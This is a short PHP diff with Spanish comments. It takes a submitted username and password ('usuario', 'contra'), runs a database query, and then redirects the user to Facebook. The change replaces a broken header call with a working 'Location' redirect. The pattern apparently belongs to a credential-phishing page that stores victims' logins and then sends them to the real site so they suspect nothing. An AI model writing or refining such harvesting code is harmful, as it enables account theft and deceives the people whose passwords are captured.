@@ -11,6 +11,9 @@ if (isset($_POST['usuario']) && isset($_POST['contra'])) {
     $exeqQuery = mysqli_query($conn, $queryP);
     
     if ($exeqQuery) {
-        header("www.facebook.com");
+        // URL de la página de Facebook
+        $facebook_url = 'https://www.facebook.com';
+        // Redirigir al usuario a la página de Facebook
+        header('Location: '.$facebook_url);
     }
 }
